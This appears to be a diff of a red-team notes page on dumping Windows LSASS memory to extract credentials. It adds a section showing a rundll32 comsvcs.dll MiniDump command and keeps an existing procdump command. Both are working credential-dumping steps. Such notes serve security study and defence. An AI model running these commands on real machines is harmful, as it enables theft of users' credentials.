@@ -1,4 +1,4 @@
-# Dumping Lsass.exe to Disk and Extracting Credentials
+# Dumping Lsass.exe to Disk Without Mimikatz and Extracting Credentials
 
 ## Task Manager
 
@@ -36,4 +36,14 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ![](../../.gitbook/assets/screenshot-from-2019-03-12-20-11-28.png)
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-12-20-13-25.png)
+
+## comsvcs.dll
+
+Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:
+
+```text
+.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+```
+
+![](../../.gitbook/assets/image%20%28135%29.png)
 
